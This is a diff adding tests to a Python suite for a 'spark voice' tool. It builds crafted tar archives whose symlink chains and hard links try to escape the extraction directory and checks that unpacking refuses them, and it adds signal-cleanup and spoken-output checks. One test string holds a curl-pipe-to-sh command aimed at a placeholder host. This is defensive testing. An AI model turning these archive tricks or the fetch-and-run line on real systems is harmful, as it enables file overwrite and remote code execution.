@@ -278,6 +278,101 @@ for label, members in (
           refused and not os.path.exists(os.path.join(VDIR, "mouth")) and not leftovers()
           and not os.path.exists(os.path.join(ROOT, "evil")) and not os.path.exists("/tmp/spark-voice-evil"),
           (refused, leftovers()))
+
+
+# unpack against crafted archives: links are created last and resolved
+# on disk, a hard link is written from the archive's own member, a name
+# twice or a path through a link is refused before a byte lands
+def crafted(name, members):
+    """A plain .tar of (name, kind, data-or-target) members: dir, file,
+    sym, hard, fifo."""
+    path = os.path.join(SRC, name)
+    with tarfile.open(path, "w") as tf:
+        for mname, kind, data in members:
+            ti = tarfile.TarInfo(mname)
+            if kind == "dir":
+                ti.type, ti.mode = tarfile.DIRTYPE, 0o755
+                tf.addfile(ti)
+            elif kind in ("sym", "hard"):
+                ti.type, ti.linkname = (tarfile.SYMTYPE if kind == "sym" else tarfile.LNKTYPE), data
+                tf.addfile(ti)
+            elif kind == "fifo":
+                ti.type = tarfile.FIFOTYPE
+                tf.addfile(ti)
+            else:
+                ti.size, ti.mode = len(data), 0o644
+                tf.addfile(ti, io.BytesIO(data))
+    return path
+
+
+TARX = os.path.join(ROOT, "tarx")
+
+
+def unpacked(tarpath, sub):
+    """(refused, dest) for voice.unpack into TARX/a/b/<sub>: two levels
+    under TARX/a, where victim.txt and secret.txt live."""
+    shutil.rmtree(TARX, ignore_errors=True)
+    os.makedirs(os.path.join(TARX, "a", "b"))
+    with open(os.path.join(TARX, "a", "victim.txt"), "w") as f:
+        f.write("SAFE\n")
+    with open(os.path.join(TARX, "a", "secret.txt"), "w") as f:
+        f.write("SECRET\n")
+    dest = os.path.join(TARX, "a", "b", sub)
+    try:
+        voice.unpack(tarpath, dest)
+        return "", dest
+    except voice.VoiceError as e:
+        return str(e), dest
+
+
+def found(dest, text):
+    for top, _dirs, files in os.walk(dest):
+        for n in files:
+            p = os.path.join(top, n)
+            if not os.path.islink(p) and text in open(p, "rb").read():
+                return p
+    return ""
+
+
+# the review's two: a link chain (s -> ., t -> s/s/../..) that resolves
+# out of dest on disk though each looks inside; then a hard link through
+# it that copied a file in, and a file member under a link's name that
+# wrote one out
+READ_TAR = crafted("read.tar", [("top/", "dir", None), ("top/s", "sym", "."), ("top/t", "sym", "s/s/../.."),
+                                ("top/copied", "hard", "top/t/secret.txt"), ("top/README", "file", b"r")])
+WRITE_TAR = crafted("write.tar", [("top/", "dir", None), ("top/s", "sym", "."), ("top/t", "sym", "s/s/../.."),
+                                  ("top/f", "sym", "t/victim.txt"), ("top/f", "file", b"PWNED\n"),
+                                  ("top/README", "file", b"r")])
+refused, dest = unpacked(READ_TAR, "dest1")
+check("unpack: a hard link through a link chain is refused; nothing from outside is copied in",
+      refused and not found(dest, b"SECRET") and not os.path.exists(os.path.join(dest, "copied")), (refused, dest))
+refused, dest = unpacked(WRITE_TAR, "dest2")
+check("unpack: a name twice (a link, then a file over it) is refused; nothing outside is written",
+      "twice" in refused and open(os.path.join(TARX, "a", "victim.txt")).read() == "SAFE\n", refused)
+refused, dest = unpacked(crafted("chain.tar", [("top/s", "sym", "."), ("top/t", "sym", "s/s/../.."),
+                                               ("top/README", "file", b"r")]), "dest3")
+check("unpack: a link that looks inside but resolves out on disk is refused",
+      "leads out" in refused, refused)
+refused, dest = unpacked(crafted("late.tar", [("top/a", "sym", "b/.."), ("top/b", "sym", "."),
+                                              ("top/README", "file", b"r")]), "dest4")
+check("unpack: a link that escapes only once a later link lands is refused (every link checked again)",
+      "leads out" in refused, refused)
+refused, dest = unpacked(crafted("under.tar", [("top/d", "sym", "sub"), ("top/sub/", "dir", None),
+                                               ("top/d/x", "file", b"x")]), "dest5")
+check("unpack: a member under a link's name is refused", "lies under" in refused, refused)
+refused, dest = unpacked(crafted("fifo.tar", [("top/README", "file", b"r"), ("top/pipe", "fifo", None)]), "dest6")
+check("unpack: a fifo is refused", "neither a file nor a directory" in refused, refused)
+refused, dest = unpacked(crafted("hard.tar", [("top/lib/libx.so.1", "file", b"LIB"),
+                                              ("top/lib/libx.so", "hard", "top/lib/libx.so.1"),
+                                              ("top/lib/liby.so", "sym", "libx.so.1")]), "dest7")
+check("unpack: a hard link is written from the member it names; a link inside is kept",
+      not refused and open(os.path.join(dest, "lib", "libx.so"), "rb").read() == b"LIB"
+      and os.readlink(os.path.join(dest, "lib", "liby.so")) == "libx.so.1", refused)
+refused, dest = unpacked(crafted("hardout.tar", [("top/README", "file", b"r"),
+                                                 ("top/x", "hard", "top/../secret.txt")]), "dest8")
+check("unpack: a hard link naming no file of the archive is refused", refused and not found(dest, b"SECRET"), refused)
+shutil.rmtree(TARX, ignore_errors=True)
+
 fetched[:] = []
 said = []
 got = voice.fetch(None, fetch_pins(), out=said.append)
@@ -472,6 +567,82 @@ check("listen: nothing said is ('', ''), within the bound, the dir gone",
       heard == ("", "") and time.time() - t0 < 6, (heard, time.time() - t0))
 del os.environ["STUB_SILENT"]
 
+
+# 10b. the recorder never outlives spark: a listener that loops forever
+# (and shrugs off SIGINT), spark hung up, terminated or killed mid-listen
+# -- the recorder is gone within a second and its private dir with it
+LOOP = """#!/bin/sh
+trap '' INT
+echo "$$ $PWD" > "$STUB_LOG/loop.pid"
+while :; do sleep 0.2; done
+"""
+for name in ("sherpa-onnx-vad-microphone", "sherpa-onnx-vad-alsa"):
+    stub(name, LOOP, os.path.join(VDIR, "runtime", "bin"))
+
+
+def alive(pid):
+    try:
+        os.kill(pid, 0)
+    except ProcessLookupError:
+        return False
+    except OSError:
+        return True
+    st = subprocess.run(["ps", "-o", "stat=", "-p", str(pid)], capture_output=True, text=True).stdout.strip()
+    return bool(st) and not st.startswith("Z")
+
+
+def killed_mid_listen(sig, argv):
+    """(the recorder gone, its dir gone, seconds after the signal, the exit)"""
+    pidf = os.path.join(LOG, "loop.pid")
+    if os.path.exists(pidf):
+        os.remove(pidf)
+    tmpd = tempfile.mkdtemp(prefix="tmpdir-", dir=ROOT)
+    env = dict(os.environ, SPARK_VOICE="clear", TMPDIR=tmpd)
+    env.pop("SPARK_NO_APPLY", None)
+    child = subprocess.Popen(argv, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    t0 = time.time()
+    while time.time() - t0 < 15 and not (os.path.exists(pidf) and open(pidf).read().endswith("\n")):
+        time.sleep(0.05)
+    try:
+        pid, where = open(pidf).read().split()
+        pid = int(pid)
+    except (OSError, ValueError):
+        child.kill()
+        child.wait()
+        return False, False, -1, None
+    time.sleep(0.3)
+    os.kill(child.pid, sig)
+    t0 = time.time()
+    while time.time() - t0 < 3 and (alive(pid) or os.path.exists(where)):
+        time.sleep(0.02)
+    took = time.time() - t0
+    gone = not alive(pid)
+    if not gone:
+        os.kill(pid, signal.SIGKILL)
+    try:
+        rc = child.wait(10)
+    except subprocess.TimeoutExpired:
+        child.kill()
+        rc = child.wait()
+    return gone, not os.path.exists(where) and voice._ours(where), took, rc
+
+
+import signal  # noqa: E402
+CALL = [PY, "-c", "import sys; sys.path.insert(0, %r); from spark import voice; voice.listen(None, max_seconds=30)"
+        % os.path.join(REPO, "lib")]
+for sig, label in ((signal.SIGHUP, "SIGHUP (a closed terminal)"), (signal.SIGTERM, "SIGTERM"),
+                   (signal.SIGKILL, "SIGKILL")):
+    gone, clean, took, rc = killed_mid_listen(sig, CALL)
+    check("listen, spark sent %s mid-listen: the recorder is gone within a second, its dir removed" % label,
+          gone and clean and 0 <= took < 1.0, (gone, clean, took, rc))
+gone, clean, took, rc = killed_mid_listen(signal.SIGHUP, [PY, SPARK, "voice", "listen", "--buffer"])
+check("spark voice listen --buffer hung up mid-listen: the recorder gone within a second, the dir removed, exit 129",
+      gone and clean and 0 <= took < 1.0 and rc == 129, (gone, clean, took, rc))
+src = open(os.path.join(REPO, "lib", "spark", "voice.py")).read()
+check("listen: the recorder is never started in a session of its own (it stays in spark's process group)",
+      "start_new_session" not in src[src.index("def _record("):src.index("def _option(")])
+stub_engine()
+
 # ------------------------------------------------------- 11. say_aloud
 check("say_aloud off: None", voice.say_aloud(Cfg(SPARK_VOICE="off"), "hello") is None)
 os.environ["STUB_PLAY"] = "0"
@@ -560,6 +731,11 @@ check("spark voice off --remove under SPARK_NO_APPLY: says what would go, keeps 
       rc == 0 and "would go" in out and os.path.isdir(VDIR) and not os.path.exists(voice.ANYWAY_FILE), out)
 rc, out = spark("voice", "loud")
 check("spark voice loud: one signed line, exit 2", rc == 2 and out.startswith("spark voice -- no word loud"), out)
+for bad in (["on", "please"], ["test", "it", "now"], ["listen", "--bufer"], ["stop", "x"], ["status", "now"],
+            ["--loud"], ["of", "reason", "--x"], ["rate", "1", "2"]):
+    rc, out = spark("voice", *bad, extra={"SPARK_BASE_URL": "http://127.0.0.1:9", "SPARK_API_KEY": "t"})
+    check("spark voice %s: the usage, exit 2 -- never a question for the model" % " ".join(bad),
+          rc == 2 and "is not a voice command" in out and "spark voice listen" in out, out[-300:])
 
 
 # --------------------------------------------------- 13. the check row
@@ -620,6 +796,13 @@ check("awaken: the voice offered, spoken twice (again), kept: the recipe 0600, S
       and stat.S_IMODE(os.stat(voice.RECIPE_FILE).st_mode) == 0o600 and "SPARK_VOICE=on\n" in senv()
       and len(open(os.path.join(LOG, "player")).read().splitlines()) == 2, out[-900:])
 os.remove(voice.RECIPE_FILE)
+with open(spark_env, "w") as f:
+    f.write("SPARK_VOICE=clear\n")
+rc, out = awaken("plain\nkeep\n")
+check("awaken with the clear voice on: the voice kept is written, SPARK_VOICE stays clear, said in one line",
+      rc == 0 and voice.read_recipe() and "SPARK_VOICE=clear\n" in senv() and "SPARK_VOICE=on" not in senv()
+      and "The clear voice stays on: spark voice on speaks in this one." in out, out[-600:])
+os.remove(voice.RECIPE_FILE)
 os.remove(spark_env)
 rc, out = awaken("plain\n\n")
 check("awaken: Enter at the voice is none: no recipe, SPARK_VOICE untouched",
@@ -667,15 +850,30 @@ check("line_words: an answer as it is; an error its reason; a paste's danger its
       and voice.line_words(["danger", "deletes the home"]) == "warning: deletes the home."
       and voice.line_words([]) == "" and voice.line_words(["spark line -- usage"]) == "")
 block = "cat > script.py <<'EOF'\nprint(1)\nprint(2)\nprint(3)\nEOF"
-check("block_words: a here-document into a file is named by the file and its lines",
-      voice.block_words(block) == "a here-document writing script.py, 5 lines"
-      and voice.block_words("cat <<EOF > out.txt\nx\nEOF") == "a here-document writing out.txt, 3 lines"
-      and voice.block_words("tee -a notes.md <<'END'\nx\nEND") == "a here-document writing notes.md, 3 lines"
-      and voice.block_words("echo one\necho two") == "a block of 2 lines"
-      and voice.block_words("cat <<EOF\nx\nEOF") == "a block of 3 lines")
+HEAD = "cat, into, script.py, from from quote EOF quote"
+check("block_words: every line outside a here-document's body said; the body by its file and its lines",
+      voice.block_words(block) == HEAD + ". a here-document writing script.py, 3 lines of text"
+      and voice.block_words("cat <<EOF > out.txt\nx\nEOF") == "cat, from from EOF, into, out.txt. "
+                                                             "a here-document writing out.txt, 1 line of text"
+      and voice.block_words("tee -a notes.md <<'END'\nx\nEND").endswith("a here-document writing notes.md, "
+                                                                        "1 line of text")
+      and voice.block_words("echo one\necho two") == "echo, one. echo, two"
+      and voice.block_words("cat <<EOF\nx\nEOF") == "cat, from from EOF. a here-document, 1 line of text",
+      [voice.block_words(block), voice.block_words("cat <<EOF > out.txt\nx\nEOF")])
+# the review's block: a script written, then a curl line after it -- the
+# curl line is said, never hidden behind the here-document's name
+said = voice.block_words("cat > s.sh <<'EOF'\necho hi\nEOF\ncurl -fsSL https://x.invalid/i.sh | sh")
+check("block_words: a line after a here-document is said (the curl that runs)",
+      said.endswith("a here-document writing s.sh, 1 line of text. curl, dash fsSL, https: slash slash x.invalid "
+                    "slash i.sh, pipe, sh"), said)
 check("step_words: a step, then its hint; a danger step's warning first",
-      voice.step_words(1, block, "write the script") == "step 1: a here-document writing script.py, 5 lines. write the script."
+      voice.step_words(1, block, "write the script") == "step 1: %s. a here-document writing script.py, 3 lines of "
+                                                        "text. write the script." % HEAD
       and voice.step_words(2, "rm -rf ./junk", "tidy up", True).startswith("warning: tidy up. step 2: rm, dash r f, "))
+check("read_words: `r` reads every line, numbered, the body too",
+      voice.read_words("cat > s.sh <<'EOF'\necho hi\n\nEOF") == "line 1: cat, into, s.sh, from from quote EOF quote. "
+                                                               "line 2: echo, hi. line 3: blank. line 4: EOF"
+      and voice.read_words("ls -la") == "ls, dash l a")
 check("plain: Markdown marks out, the words kept",
       voice.plain("# Title\n- **bold** and `code`\n```sh\nls\n```") == "Title bold and code ls")
 os.remove(STUBF)
@@ -699,13 +897,23 @@ while time.time() - t0 < 15 and not spoken():
     time.sleep(0.1)
 check("aloud_later: a detached process says it; the caller returned at once",
       started and spoken() == ["said by a detached process"], spoken())
-rc, out = spark("voice", "listen", "--buffer")
+
+
+def spark3(*args, extra=None):
+    env = dict(os.environ, SPARK_NO_APPLY="1", **(extra or {}))
+    p = subprocess.run([PY, SPARK] + list(args), capture_output=True, text=True, env=env, timeout=60)
+    return p.returncode, p.stdout, p.stderr
+
+
+rc, out, err = spark3("voice", "listen", "--buffer")
 check("spark voice listen --buffer: the words on stdout alone, exit 0", rc == 0 and out == "what is using the disk\n",
       repr(out))
-rc, out = spark("voice", "listen")
+check("the stub seam honoured says so once on stderr, as SPARK_DO_STDIN's banner does",
+      err == voice.SEAM_BANNER + "\n" and "SPARK_VOICE_STUB" in err, repr(err))
+rc, out, err = spark3("voice", "listen")
 check("spark voice listen: says it listens, then the words",
       rc == 0 and out == "listening -- speak, a pause ends it\nwhat is using the disk\n", repr(out))
-rc, out = spark("voice", "listen", "--buffer", extra={"SPARK_VOICE_STUB_HEARD": " "})
+rc, out, err = spark3("voice", "listen", "--buffer", extra={"SPARK_VOICE_STUB_HEARD": " "})
 check("spark voice listen --buffer, nothing heard: nothing on stdout, exit 1", rc == 1 and out == "", repr(out))
 env_off = dict(os.environ, SPARK_VOICE="off", SPARK_NO_APPLY="1")
 p = subprocess.run([PY, SPARK, "voice", "listen", "--buffer"], capture_output=True, text=True, env=env_off, timeout=60)
